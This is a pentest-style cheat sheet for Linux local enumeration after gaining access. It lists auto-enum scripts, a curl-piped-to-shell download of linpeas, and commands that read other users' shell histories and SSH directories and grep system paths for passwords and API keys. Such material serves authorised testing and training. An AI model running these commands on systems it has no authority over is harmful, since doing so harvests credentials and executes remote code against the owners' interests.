---
title: Linux Local Enumeration
category: privesc-linux
description: Manual checks plus the usual auto-enum scripts.
tags: [linux, privesc, enumeration]
os: [linux]
order: 5
---

## Auto-enum

```bash
# Drop & run
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# OR: scp linpeas.sh victim:/tmp && sh /tmp/linpeas.sh
./linenum.sh -t -k password
./lse.sh -l1
pspy64 -pf -i 1000
```

## System & kernel

```bash
uname -a; cat /etc/os-release; arch
cat /proc/version
dpkg -l | head ; rpm -qa | head
```

Search exploit-db for matching kernel/distro:

```bash
searchsploit "Ubuntu 22.04"
searchsploit "kernel 5.15"
```

## Users & groups

```bash
id; groups; whoami; w; last -a | head
cat /etc/passwd | grep -v nologin
cut -d: -f1 /etc/passwd
getent passwd
cat /etc/group
```

## Network & processes

```bash
ip a; ss -tulpn; ss -tnp; netstat -punta
ps auxf
lsof -i
crontab -l; sudo -ln
ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null
```

## SUID / SGID / capabilities

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
find / -writable -type d 2>/dev/null | grep -v proc
```

Cross-ref hits against [GTFOBins](https://gtfobins.github.io/).

## Files of interest

```bash
ls -la /home/*/   /root/
cat ~/.bash_history /home/*/.bash_history 2>/dev/null
ls -la ~/.ssh /home/*/.ssh /root/.ssh 2>/dev/null
grep -rinE 'password|passwd|secret|api[_-]?key' /etc /var/www /opt /home 2>/dev/null | head -50
find / -name "*.bak" -o -name "*.conf" -o -name "*.config" 2>/dev/null | grep -v /proc
```

## Mounts & disks

```bash
mount; df -h; cat /etc/fstab
lsblk
```

## Containers / sandbox

```bash
ls -la /.dockerenv 2>/dev/null && echo "in docker"
cat /proc/1/cgroup
capsh --print
mount | grep -E 'docker|overlay|cgroup'
```
